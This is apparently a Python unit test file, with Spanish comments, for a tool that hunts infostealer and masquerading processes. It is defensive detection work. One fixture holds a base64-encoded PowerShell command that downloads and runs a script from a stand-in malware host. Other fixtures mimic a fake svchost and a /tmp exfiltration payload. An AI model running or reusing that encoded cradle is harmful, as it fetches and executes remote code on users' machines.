"""Tests para el detector de infostealers y procesos maliciosos en memoria."""
import unittest
from unittest.mock import patch
from cookieguard.process_hunter import scan_processes


class TestProcessHunter(unittest.TestCase):
    def test_clean_processes(self):
        procs = [
            {"pid": 100, "ppid": 1, "name": "chrome.exe", "cmd": "chrome.exe", "exe": "C:\\Program Files\\Google\\Chrome\\chrome.exe"},
            {"pid": 200, "ppid": 1, "name": "explorer.exe", "cmd": "explorer.exe", "exe": "C:\\Windows\\explorer.exe"},
            {"pid": 300, "ppid": 1, "name": "python", "cmd": "python -m cookieguard", "exe": "/usr/bin/python3"}
        ]
        res = scan_processes(procs)
        self.assertTrue(res["limpio"])
        self.assertEqual(res["sospechosos_count"], 0)

    @patch("cookieguard.process_hunter.IS_WIN", True)
    def test_masquerading_detection(self):
        procs = [
            {"pid": 666, "ppid": 1, "name": "svchost.exe", "cmd": "svchost.exe",
             "exe": "C:\\Users\\Victima\\AppData\\Local\\Temp\\svchost.exe"}
        ]
        res = scan_processes(procs)
        self.assertFalse(res["limpio"])
        self.assertEqual(res["sospechosos_count"], 1)
        s = res["sospechosos"][0]
        self.assertEqual(s["pid"], 666)
        self.assertEqual(s["severidad"], "CRITICA")
        self.assertIn("Masquerading", s["familia"])

    def test_powershell_encoded_command(self):
        procs = [
            {"pid": 999, "ppid": 50, "name": "powershell.exe",
             "cmd": "powershell.exe -NoProfile -NonInteractive -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsd2FyZS54eXovcycp",
             "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
        ]
        res = scan_processes(procs)
        self.assertFalse(res["limpio"])
        self.assertEqual(res["sospechosos_count"], 1)
        s = res["sospechosos"][0]
        self.assertIn("PowerShell con comando codificado", s["motivo"])

    @patch("cookieguard.process_hunter.IS_LINUX", True)
    def test_linux_tmp_binary(self):
        procs = [
            {"pid": 1234, "ppid": 1, "name": "stealc_payload",
             "cmd": "/tmp/stealc_payload --exfil", "exe": "/tmp/stealc_payload"}
        ]
        res = scan_processes(procs)
        self.assertFalse(res["limpio"])
        s = res["sospechosos"][0]
        self.assertIn("/tmp", s["motivo"])
        self.assertEqual(s["comando"], "kill -9 1234")


if __name__ == "__main__":
    unittest.main()
